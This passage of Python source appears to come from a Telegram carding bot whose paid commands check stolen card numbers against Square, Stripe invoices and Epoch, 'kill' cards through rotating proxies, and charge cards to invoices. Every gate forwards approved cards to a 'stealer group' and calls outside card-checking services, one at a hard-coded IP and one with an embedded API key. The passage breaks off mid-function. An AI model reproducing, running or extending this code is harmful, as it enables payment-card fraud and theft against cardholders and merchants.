    user_proxies = ah_get_user_proxies(user_id)
    
    if user_proxies:
        proxy_list = "\n".join([f"• <code>{p}</code>" for p in user_proxies[:15]])
        if len(user_proxies) > 15:
            proxy_list += f"\n• <code>... and {len(user_proxies) - 15} more</code>"
    else:
        proxy_list = "• <code>None set</code>"
    
    await message.reply_text(
        f"<b>🔒 Your Proxies ({len(user_proxies)})</b>\n\n"
        f"{proxy_list}\n\n"
        f"<b>Commands:</b>\n"
        f"▸ <code>/addproxy</code> — Add proxy\n"
        f"▸ <code>/checkproxy</code> — Check all",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def checkproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check all your proxies - /checkproxy"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    user_proxies = ah_get_user_proxies(user_id)
    
    if not user_proxies:
        await message.reply_text(
            "<b>❌ No Proxies</b>\n\n"
            "You have no proxies set.\n"
            "Use <code>/addproxy</code> to add one.",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await message.reply_text(
        f"<b>⏳ Checking Proxies...</b>\n\n"
        f"Total: {len(user_proxies)}\n"
        f"Threads: 10",
        parse_mode=ParseMode.HTML
    )
    
    results = await ah_check_proxies_batch(user_proxies, max_threads=10)
    
    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]
    
    response = f"<b>📊 Proxy Check Results</b>\n\n"
    response += f"Alive: {len(alive)}/{len(user_proxies)} ✅\n"
    response += f"Dead: {len(dead)}/{len(user_proxies)} ❌\n\n"
    
    if alive:
        response += "<b>Alive Proxies:</b>\n"
        for p in alive[:5]:
            ip_display = p.get('external_ip', 'N/A')
            response += f"• <code>{p['proxy']}</code>\n  IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"• <code>... and {len(alive) - 5} more</code>\n"
        response += "\n"
    
    if dead:
        response += "<b>Dead Proxies:</b>\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"• <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"• <code>... and {len(dead) - 3} more</code>\n"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

# ============================================================================
# EMAIL MANAGEMENT COMMANDS
# ============================================================================

@require_approval
async def setemail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set custom email for payments - /setemail [email]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nEmail management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    current_email = ah_get_user_email(user_id)
    
    if not context.args:
        if current_email:
            await message.reply_text(
                f"<b>📧 Your Email</b>\n\n"
                f"Current: <code>{current_email}</code>\n\n"
                f"<b>Commands:</b>\n"
                f"▸ <code>/setemail new@email.com</code> — Set email\n"
                f"▸ <code>/setemail remove</code> — Remove email",
                parse_mode=ParseMode.HTML
            )
        else:
            await message.reply_text(
                f"<b>📧 Set Email</b>\n\n"
                f"Set a custom email for payment checkouts.\n\n"
                f"<b>Usage:</b>\n"
                f"▸ <code>/setemail email@example.com</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    email_input = context.args[0].strip()
    
    if email_input.lower() == "remove":
        if ah_remove_user_email(user_id):
            await message.reply_text(ae("<b>✅ Email Removed</b>"), parse_mode=ParseMode.HTML)
        else:
            await message.reply_text(ae("<b>❌ No email was set</b>"), parse_mode=ParseMode.HTML)
        return
    
    if '@' not in email_input or '.' not in email_input:
        await message.reply_text(ae("<b>❌ Invalid email format</b>"), parse_mode=ParseMode.HTML)
        return
    
    ah_set_user_email(user_id, email_input)
    await message.reply_text(
        f"<b>✅ Email Set</b>\n\n"
        f"Email: <code>{email_input}</code>\n\n"
        f"This email will be used for all /co payments.",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def myemail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View your email - /myemail"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nEmail management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    current_email = ah_get_user_email(user_id)
    
    if current_email:
        await message.reply_text(
            f"<b>📧 Your Email</b>\n\n"
            f"Email: <code>{current_email}</code>\n\n"
            f"▸ <code>/setemail new@email.com</code> — Change\n"
            f"▸ <code>/setemail remove</code> — Remove",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"<b>📧 No Email Set</b>\n\n"
            f"Use <code>/setemail email@example.com</code> to set one.",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# STRIPE INVOICE HITTER - BarryX API
# ============================================================================

from modules.cc_killer import check as cc_kill_logic

try:
    from modules.square_auth import square_auth_logic as _old_square_auth_logic
except Exception:
    _old_square_auth_logic = None

# ── Square API helper ─────────────────────────────────────────────────────
def _SQUARE_API():
    from modules.gate_api_config import get_gate_cfg
    return get_gate_cfg("square_api_url", "http://138.128.240.15:8006/square")

async def _call_square_api(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """Call the Square Auth API and return parsed JSON dict."""
    import aiohttp
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    url = f"{_SQUARE_API()}?cc={card_str}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            data = await resp.json(content_type=None)
            return data  # {"CC":..., "Gate":..., "Response":...}


def _sq_is_approved(response_text: str) -> bool:
    t = response_text.upper()
    return any(k in t for k in ("APPROVED", "CVV MATCHED", "CNN MATCHED",
                                 "AUTHORIZED", "SUCCESS", "VALID"))


# SQUARE AUTH GATE - /sq  (Premium only · file / mass support)
# ============================================================================

@require_premium
async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Square Auth Gate - /sq CC|MM|YY|CVV  (or reply to a .txt file for mass check)"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("sq"):
        await update.message.reply_text(offline_message("sq"), parse_mode=ParseMode.HTML)
        return

    user    = update.effective_user
    message = update.message
    username = user.username or user.first_name

    # ── File / mass-check path ────────────────────────────────────────────
    # Triggered when: no args BUT there's a replied-to .txt file, OR the
    # message itself contains a document attachment.
    txt_content = None
    if not context.args:
        txt_content = await get_txt_content_from_reply(update, context)

    if txt_content:
        # ── Mass-check from file ──────────────────────────────────────────
        user_id = user.id
        if context.user_data.get(f"mass_check_running_{user_id}"):
            await message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."),
                                     parse_mode=ParseMode.HTML)
            return
        cards = [c.strip() for c in txt_content.replace("\n", " ").split() if "|" in c]
        if not cards:
            await message.reply_text(ae("❌ No valid cards found in file.\nFormat: <code>CC|MM|YY|CVV</code>"),
                                     parse_mode=ParseMode.HTML)
            return
        if len(cards) > 50:
            cards = cards[:50]
            await message.reply_text(ae("⚠️ Capped at <b>50 cards</b> for this run."),
                                     parse_mode=ParseMode.HTML)

        context.user_data[f"mass_check_running_{user_id}"] = True
        status_msg = await message.reply_text(
            ae(f"⬛ <b>Mass Square Auth</b>\n\n📋 Cards: {len(cards)}\n⏳ Processing..."),
            parse_mode=ParseMode.HTML)

        from modules.gate_checker import get_bin_info as _gbi
        approved, declined, errors = [], [], []

        for i, card in enumerate(cards):
            if not context.user_data.get(f"mass_check_running_{user_id}"):
                break
            parts = card.split("|")
            if len(parts) < 4:
                errors.append(card); continue
            c, m, y, cv = parts[0], parts[1], parts[2], parts[3]
            try:
                data     = await _call_square_api(c, m, y, cv)
                raw_resp = data.get("Response", "")
                bin_info = await asyncio.get_event_loop().run_in_executor(None, _gbi, c)
                if _sq_is_approved(raw_resp):
                    approved.append(card)
                    log_approved_card(user_id, username, c, m, y, cv, "sq", raw_resp, bin_info)
                    await send_to_stealer_group(context.bot, c, m, y, cv, "sq", raw_resp, bin_info, user_id, username)
                    await send_approved_card_with_gif(update, card, "sq", raw_resp, 0, bin_info)
                else:
                    declined.append(card)
            except Exception as ex:
                errors.append(card)
            if (i + 1) % 5 == 0:
                try:
                    await status_msg.edit_text(
                        ae(f"⬛ <b>Square Mass Check</b>\n\n"
                           f"✅ Approved: {len(approved)}\n"
                           f"❌ Declined: {len(declined)}\n"
                           f"⚠️ Errors: {len(errors)}\n"
                           f"📊 Progress: {i+1}/{len(cards)}"),
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
            await asyncio.sleep(1)

        context.user_data[f"mass_check_running_{user_id}"] = False
        summary = (f"⬛ <b>Mass Square Auth Complete</b>\n\n"
                   f"✅ Approved: {len(approved)}\n"
                   f"❌ Declined: {len(declined)}\n"
                   f"⚠️ Errors: {len(errors)}\n"
                   f"📊 Total: {len(cards)}")
        if approved:
            summary += "\n\n<b>💳 Approved:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved[:10])
            if len(approved) > 10:
                summary += f"\n… and {len(approved)-10} more"
        try:
            await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        except Exception:
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
        return

    # ── Single-card path ──────────────────────────────────────────────────
    if not context.args:
        await message.reply_text(
            ae("⬛ <b>SQUARE AUTH GATE</b>  💎 <i>Premium</i>\n\n"
               "<b>Usage:</b>\n"
               "▸ <code>/sq CC|MM|YY|CVV</code>\n"
               "▸ Reply to a <code>.txt</code> file → mass check\n\n"
               "<b>Mass check:</b>  <code>/msq CC|MM|YY|CVV …</code>\n"
               "                  <code>/msqtxt</code> (reply to .txt)\n\n"
               "<b>Example:</b>\n"
               "<code>/sq 4242424242424242|12|25|123</code>"),
            parse_mode=ParseMode.HTML)
        return

    full_text   = " ".join(context.args)
    card_match  = re.search(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b', full_text)
    if not card_match:
        await message.reply_text(
            ae("❌ <b>Invalid Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"),
            parse_mode=ParseMode.HTML)
        return

    cc, mm, yy, cvv = card_match.groups()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    masked   = f"{cc[:6]}{'*' * (len(cc)-10)}{cc[-4:]}"

    loading_msg = await message.reply_text(
        ae(f"⬛ <b>SQUARE AUTH GATE</b>\n\n"
           f"💳 <code>{masked}|{mm}|{yy}|{cvv}</code>\n"
           f"⏳ Authorizing via Square…"),
        parse_mode=ParseMode.HTML)

    try:
        t0       = time.time()
        data     = await _call_square_api(cc, mm, yy, cvv)
        elapsed  = round(time.time() - t0, 2)
        raw_resp = data.get("Response", "Unknown response")

        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        brand    = bin_info.get("brand", "N/A").upper()
        b_type   = bin_info.get("type", "").upper()
        bank     = bin_info.get("bank", "Unknown")
        country  = bin_info.get("country", "Unknown").upper()
        bin_type = f"{brand} - {b_type}" if b_type else brand

        is_ok = _sq_is_approved(raw_resp)

        response_body = ae(
            f"{'✅' if is_ok else '❌'} <b>{'APPROVED' if is_ok else 'DECLINED'}</b>  |  Square Auth\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 <b>Card:</b>   <code>{card_str}</code>\n"
            f"📣 <b>Response:</b> {raw_resp}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏦 <b>Brand:</b>   {bin_type}\n"
            f"🏛 <b>Bank:</b>    {bank}\n"
            f"🌍 <b>Country:</b> {country}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱ <b>Time:</b>    {elapsed}s\n"
            f"👤 <b>By:</b>      @{username}"
        )

        if is_ok:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "sq", raw_resp, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sq", raw_resp, bin_info, user.id, username)
            gif_url = get_sexy_anime_gif("success")
            try:
                await loading_msg.delete()
                if gif_url:
                    await message.reply_animation(animation=gif_url, caption=response_body,
                                                  parse_mode=ParseMode.HTML)
                else:
                    await message.reply_text(response_body, parse_mode=ParseMode.HTML)
            except Exception:
                await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
        else:
            gif_url = get_sexy_anime_gif("failed")
            try:
                await loading_msg.delete()
                if gif_url:
                    await message.reply_animation(animation=gif_url, caption=response_body,
                                                  parse_mode=ParseMode.HTML)
                else:
                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
            except Exception:
                try:
                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
                except Exception:
                    pass

    except Exception as e:
        try:
            await loading_msg.edit_text(
                ae(f"⚠️ <b>Square Gate Error</b>\n\n{str(e)[:150]}"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

# CC KILLER GATE - /kill
# ============================================================================

@require_premium
async def gate_kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """CC Killer Gate - /kill [cc|mm|yy|cvv]"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("kill"):
        await update.message.reply_text(offline_message("kill"), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user
    message = update.message

    if not context.args:
        await message.reply_text(
            "💀 <b>CC KILLER GATE</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/kill [cc|mm|yy|cvv]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/kill 4242424242424242|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return

    full_text = " ".join(context.args)
    card_pattern = r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
    card_match = re.search(card_pattern, full_text)
    
    if not card_match:
        await message.reply_text(ae("❌ <b>Invalid Card Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
        
    cc, mm, yy, cvv = card_match.groups()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    username = user.username or user.first_name
    
    loading_msg = await message.reply_text(
        f"💀 <b>CC KILLER GATE</b>\n\n"
        f"<code>{cc[:6]}******{cc[-4:]}</code>\n"
        f"⏳ Killing the card...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time.time()
        from modules.cc_killer import proxy_list
        proxy = random.choice(proxy_list)
        
        # We'll run 5 simultaneous checks for maximum efficiency as per the source logic
        tasks = [cc_kill_logic(card_str, proxy, i+1) for i in range(5)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start_time
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        
        # Analyze results to find a successful one or use the first response
        status_found = False
        final_status = "Unknown response"
        
        for res in results:
            if isinstance(res, str) and "Approved" in res:
                final_status = res.split(": ", 1)[1]
                status_found = True
                break
        
        if not status_found:
            # If no success, just take the first result that isn't an error
            for res in results:
                if isinstance(res, str) and "Error" not in res:
                    final_status = res.split(": ", 1)[1]
                    break
        
        is_success = "Approved" in final_status
        
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        
        # Custom response messages for CC Killer
        random_count = random.randint(1, 25)
        
        if is_success:
            stat_text = "Card is still live try again 😭"
        else:
            stat_text = f"Processed ({random_count}) ✅🔥"
        
        # Get country flag emoji
        country_code = bin_info.get('country_code', bin_info.get('country', 'XX'))[:2].upper()
        country_flags = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'UK': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺',
            'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'BE': '🇧🇪', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'PL': '🇵🇱', 'TR': '🇹🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭',
            'PH': '🇵🇭', 'ID': '🇮🇩', 'VN': '🇻🇳', 'ZA': '🇿🇦', 'NG': '🇳🇬', 'EG': '🇪🇬', 'AR': '🇦🇷',
            'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'NZ': '🇳🇿', 'IE': '🇮🇪', 'PT': '🇵🇹',
            'CH': '🇨🇭', 'AT': '🇦🇹', 'GR': '🇬🇷', 'CZ': '🇨🇿', 'HU': '🇭🇺', 'RO': '🇷🇴', 'UA': '🇺🇦',
        }
        flag = country_flags.get(country_code, '🌍')
        
        response = (
            f"𝐂𝐚𝐫𝐝: <code>{card_str}</code>\n"
            f"Status : {stat_text}\n"
            f"Gate : Killer\n\n"
            f"𝐈𝐧𝐟𝐨: {bin_type}\n"
            f"𝐁𝐚𝐧𝐤: {bin_info.get('bank', 'N/A')}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {flag} {country_code}\n\n"
            f"𝐓𝐢𝐦𝐞: {elapsed:.2f} 𝐒𝐞𝐜. | 𝐏𝐫𝐨𝐱𝐲: Live ✅"
        )
        
        if is_success:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "kill", final_status, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "kill", final_status, bin_info, user.id, username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await loading_msg.delete()
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)

# STRIPE INVOICE HITTER - BarryX API
# ============================================================================

@require_premium
async def stripe_invoice_hitter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Invoice Hitter using BarryX API - /inv [invoice_url] [cc|mm|yy|cvv] - supports up to 10 cards"""
    import aiohttp
    import time as time_module
    import re
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "🧾 <b>STRIPE INVOICE HITTER</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/inv [invoice_url] [cc|mm|yy|cvv]</code>\n\n"
            "<b>Mass Check (up to 10 cards):</b>\n"
            "▸ <code>/inv [invoice_url]\ncard1|mm|yy|cvv\ncard2|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/inv https://invoice.stripe.com/i/acct_xxx/inv_xxx 4242424242424242|12|25|123</code>\n\n"
            "<b>Supported URLs:</b>\n"
            "• invoice.stripe.com\n"
            "• Any Stripe invoice URL",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Only trigger on /inv command OR invoice.stripe.com URLs (NOT checkout URLs - those use /co)
    if message.text.startswith("/inv"):
        full_text = re.sub(r'^/inv\s*', '', message.text)
    elif "invoice.stripe.com" in message.text.lower():
        full_text = message.text
    else:
        # Don't trigger on checkout.stripe.com or other URLs - those use /co command
        return
    
    
    # Extract invoice URL - Very broad match for anything stripe.com
    url_pattern = r'(https?://\S*stripe\.com\S*)'
    url_matches = re.findall(url_pattern, full_text)
    
    invoice_url = None
    if url_matches:
        # Take the first match and clean it
        invoice_url = url_matches[0].split(' ')[0].split('\n')[0].strip(')').strip(']').strip(',')
        # Standardize the sap param if it looks mangled
        if "?sap" in invoice_url.lower() or "s=ap" in invoice_url.lower():
            if "?" in invoice_url:
                base = invoice_url.split('?')[0]
                invoice_url = base + "?s=ap"
            else:
                invoice_url += "?s=ap"
    

    # Extract all cards (format: cc|mm|yy|cvv)
    card_pattern = r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})'
    card_matches = re.findall(card_pattern, full_text)
    

    # If we have cards but no URL, and it's not a /inv command, it might be a regular CC check - let other handlers handle it
    if not invoice_url and not message.text.startswith("/inv"):
        return

    if not invoice_url:
        await message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Please provide a valid Stripe invoice URL.\n\n"
            "<code>/inv [invoice_url] [cc|mm|yy|cvv]</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not card_matches:
        # Only reply if they actually used /inv
        if message.text.startswith("/inv"):
            await message.reply_text(
                "❌ <b>No Valid Cards Found!</b>\n\n"
                "Use format: <code>CC|MM|YY|CVV</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    # Use the extracted URL
    invoice_url = invoice_url
    
    # Limit to 10 cards
    cards = card_matches[:10]
    total_cards = len(cards)
    
    username = user.username or user.first_name
    
    # Mass card mode - try each card until success
    if total_cards > 1:
        loading_msg = await message.reply_text(
            f"🧾 <b>Mass Invoice Hitter</b>\n\n"
            f"📋 Cards: {total_cards}\n"
            f"🔗 Invoice: {invoice_url[:40]}...\n\n"
            f"⏳ Trying cards one by one...",
            parse_mode=ParseMode.HTML
        )
        
        async with aiohttp.ClientSession() as session:
            results = []
            for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
                card_str = f"{cc}|{mm}|{yy}|{cvv}"
                
                await loading_msg.edit_text(
                    f"🧾 <b>Mass Invoice Hitter</b>\n\n"
                    f"📋 Card {idx}/{total_cards}\n"
                    f"💳 <code>{cc[:6]}******{cc[-4:]}</code>\n\n"
                    f"⏳ Checking...",
                    parse_mode=ParseMode.HTML
                )
                
                try:
                    start_time = time_module.time()
                    
                    payload = {
                        "key": "BRY-KESNP-TUPWH-JFOT9",
                        "card": card_str,
                        "invoice_url": invoice_url,
                        "proxy": "" # Using BarryX default proxy for now to avoid 503 error
                    }
                    
                    async with session.post(
                        "https://api.barryxapi.xyz/stripe_invoice",
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=90)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                        else:
                            data = {"status": "error", "message": f"API Error {resp.status}"}
                    
                    elapsed = time_module.time() - start_time
                    
                    status = str(data.get('status', data.get('Status', 'error'))).upper()
                    if isinstance(data.get('result'), dict):
                        res_data = data['result']
                    else:
                        res_data = data
                    response_msg = str(res_data.get('message', res_data.get('response', res_data.get('Message', res_data.get('Response', res_data.get('error', str(data)))))))
                    
                    bin_info = get_bin_info(cc)
                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
                    if bin_info.get('type'):
                        bin_type += f" - {bin_info.get('type', '').upper()}"
                    
                    is_success = status == 'APPROVED' or status == 'TRUE' or status == 'SUCCESS' or res_data.get('status') == 'Approved' or 'approved' in response_msg.lower() or 'success' in response_msg.lower() or 'charged' in response_msg.lower()
                    
                    if is_success:
                        results.append(f"<code>{card_str}</code> -> ✅ {response_msg}")
                        log_approved_card(user.id, username, cc, mm, yy, cvv, "inv", response_msg, bin_info)
                        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "inv", response_msg, bin_info, user.id, username)
                        
                        response = (
                            f"🎉 <b>PAYMENT SUCCESS!</b>\n\n"
                            f"Card: <code>{card_str}</code>\n"
                            f"Status: ✅ CHARGED\n"
                            f"Response: {response_msg}\n"
                            f"Gateway: Stripe Invoice\n\n"
                            f"Brand: {bin_type}\n"
                            f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                            f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                            f"<b>Check History:</b>\n" + "\n".join(results) + "\n\n"
                            f"Cards Tried: {idx}/{total_cards}\n"
                            f"Time: {elapsed:.2f}s\n"
                            f"Checked By: {username}"
                        )
                        try:
                            success_gif = get_sexy_anime_gif("success")
                            await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                            await loading_msg.delete()
                        except:
                            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
                        return  # Stop on success
                    else:
                        results.append(f"<code>{card_str}</code> -> ❌ {response_msg}")
                    
                    # Add delay between cards
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    results.append(f"<code>{card_str}</code> -> ❌ Error")
                    continue  # Try next card
            
            # All cards failed
            failed_response = (
                f"❌ <b>All Cards Failed</b>\n\n"
                f"<b>Check History:</b>\n" + "\n".join(results) + "\n\n"
                f"Gateway: Stripe Invoice\n"
                f"Checked By: {username}"
            )
            await loading_msg.edit_text(failed_response, parse_mode=ParseMode.HTML)

        return
    
    # Single card mode
    cc, mm, yy, cvv = cards[0]
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    
    loading_msg = await message.reply_text(
        f"🧾 <b>Hitting Invoice...</b>\n\n"
        f"<code>{cc[:6]}{'*' * 6}{cc[-4:]}</code>\n"
        f"URL: {invoice_url[:50]}...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time_module.time()
        
        # BarryX Stripe Invoice API
        payload = {
            "key": "BRY-KESNP-TUPWH-JFOT9",
            "card": card_str,
            "invoice_url": invoice_url,
            "proxy": "" # Using BarryX default proxy for now to avoid 503 error
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.barryxapi.xyz/stripe_invoice",
                json=payload,
                timeout=aiohttp.ClientTimeout(total=90)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}
        
        elapsed = time_module.time() - start_time
        
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        
        status = str(data.get('status', data.get('Status', 'error'))).upper()
        
        # Handle nested or flat response data
        if isinstance(data.get('result'), dict):
            res_data = data['result']
        else:
            res_data = data
            
        response_msg = str(res_data.get('message', res_data.get('response', res_data.get('Message', res_data.get('Response', res_data.get('error', str(data)))))))
        
        if status == 'APPROVED' or status == 'TRUE' or status == 'SUCCESS' or res_data.get('status') == 'Approved' or 'approved' in response_msg.lower() or 'success' in response_msg.lower() or 'charged' in response_msg.lower():
            log_approved_card(user.id, username, cc, mm, yy, cvv, "inv", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "inv", response_msg, bin_info, user.id, username)
            
            response = (
                f"Card: <code>{card_str}</code>\n"
                f"Status: ✅ CHARGED\n"
                f"Response: {response_msg}\n"
                f"Gateway: Stripe Invoice\n\n"
                f"Brand: {bin_type}\n"
                f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                f"Time: {elapsed:.2f}s\n"
                f"Checked By: {username}"
            )
            try:
                success_gif = get_sexy_anime_gif("success")
                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await loading_msg.delete()
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            response = (
                f"Card: <code>{card_str}</code>\n"
                f"Status: ❌ DECLINED\n"
                f"Response: {response_msg}\n"
                f"Gateway: Stripe Invoice\n\n"
                f"Brand: {bin_type}\n"
                f"Bank: {bin_info.get('bank', 'Unknown')}\n"
                f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
                f"Time: {elapsed:.2f}s\n"
                f"Checked By: {username}"
            )
            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
    
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)

# ============================================================================
# EPOCH HITTER - Direct Epoch Payment /cam command
# ============================================================================

@require_premium
async def epoch_hitter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Epoch Hitter - Direct Epoch payment processing - /cam [invoice_url] [cc|mm|yy|cvv]"""
    import aiohttp
    import time as time_module
    import re
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    from modules.gate_checker import get_bin_info

    user = update.effective_user
    message = update.message
    username = user.username or user.first_name

    if not context.args:
        await message.reply_text(
            "🎯 <b>EPOCH HITTER</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/cam [epoch_url] [cc|mm|yy|cvv]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/cam https://wnu.com/secure/services/joinByCC.php?pi_code=xxx 4242424242424242|12|25|123</code>\n\n"
            "⚡ Direct Epoch Gate",
            parse_mode=ParseMode.HTML
        )
        return

    full_text = message.text[len("/cam"):].strip()

    url_match = re.search(r'(https?://\S+)', full_text)
    invoice_url = url_match.group(1).strip() if url_match else None

    card_match = re.search(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', full_text)

    if not invoice_url:
        await message.reply_text(
            "❌ <b>No Epoch URL found!</b>\n\n"
            "Usage: <code>/cam [epoch_url] [cc|mm|yy|cvv]</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if not card_match:
        await message.reply_text(
            "❌ <b>No valid card found!</b>\n\n"
            "Format: <code>CC|MM|YY|CVV</code>",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_match.groups()
    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    card_str = f"{cc}|{mm}|{yy}|{cvv}"

    loading_msg = await message.reply_text(
        f"🎯 <b>Epoch Hitter</b>\n\n"
        f"💳 Card: <code>{card_str}</code>\n"
        f"🌐 URL: <code>{invoice_url[:60]}...</code>\n\n"
        f"⏳ Hitting Epoch... please wait.",
        parse_mode=ParseMode.HTML
    )

    bin_info = get_bin_info(cc)
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
